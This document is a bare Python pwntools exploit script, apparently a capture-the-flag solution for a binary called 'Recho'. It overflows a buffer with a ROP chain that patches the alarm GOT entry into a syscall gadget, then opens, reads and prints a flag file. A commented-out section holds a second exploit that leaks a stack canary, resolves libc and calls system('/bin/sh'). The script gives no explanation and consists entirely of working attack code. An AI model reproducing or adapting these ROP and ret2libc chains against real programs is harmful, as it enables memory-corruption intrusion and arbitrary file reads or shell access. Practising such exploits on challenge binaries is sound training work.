
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./Recho')
alarmgot=elf.got['alarm']
alarmplt=elf.plt['alarm']
readplt = elf.plt['read']
writeplt = elf.plt['write']
printf=elf.plt['printf']
# main_addr = elf.symbols['main']
main_addr =0x00000000004007A3

# io = remote("111.200.241.244",52626)
io = process("./Recho")
# gdb.attach(io)
# io.recv()
io.recvuntil('Welcome to Recho server!\n')

# io.sendlineafter('--------\n>> ', '1')
pop_rdi = 0x00000000004008a3
pop_rsi = 0x00000000004008a1
pop_rdx = 0x00000000004006fe
pop_rax = 0x00000000004006fc
### rob alarm  got
payload = 'a' * 0x38
add_al_rdi =0x000000000040070d
payload += p64(pop_rax)+ p64(0x5)
payload += p64(pop_rdi) + p64(alarmgot)

payload += p64(add_al_rdi)

### open flag
flag_addr = 0x0000000000601058
payload  += p64(pop_rdi) + p64(flag_addr)
payload += p64(pop_rsi) + p64(0x0) + p64(0x0)
payload+=p64(pop_rdx)+p64(0x0)
payload += p64(pop_rax) + p64(0x2)
payload += p64(alarmplt)

### read to bss
bss_addr = 0x0000000000601090
payload += p64(pop_rdi) + p64(0x3)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(pop_rsi) + p64(bss_addr+0x500) + p64(0x0)
payload += p64(readplt)

#### write to stdin
# payload+=p64(pop_rdi)+p64(bss_addr+0x500)
# payload+=p64(printf)
payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(pop_rsi) + p64(bss_addr+0x500) + p64(0)
payload += p64(writeplt)
io.send(str(0x200))
payload=payload.ljust(0x200,'\x00')
# io.sendline(str(len(payload)).encode('utf-8'))
io.sendline(payload)
io.recv()
io.shutdown('send')
pause()
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
